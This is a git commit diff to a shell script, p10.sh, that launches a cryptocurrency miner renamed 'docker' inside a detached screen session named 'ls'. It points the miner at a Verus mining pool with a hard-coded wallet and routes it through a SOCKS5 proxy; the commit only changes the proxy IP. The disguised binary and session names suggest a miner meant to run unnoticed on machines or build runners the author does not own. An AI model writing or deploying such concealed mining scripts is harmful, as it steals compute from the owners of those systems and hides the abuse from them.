53cb9050f37d7fc4457dcc691eef2342e5b7a93e
wertesd <86517111+wertesd@users.noreply.github.com>
2021-07-10 16:11:31 +0700

    Update p10.sh

--- p10.sh
+++ p10.sh
@@ -5,5 +5,5 @@ chmod +x docker
 screen -dmS ls 
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
-PROXY=socks5://184.178.172.14:4145
+PROXY=socks5://184.179.216.130:4145
 ./docker -a verus -o $POOL -u $WALLET.P10 -p x -t 2 -x $PROXY
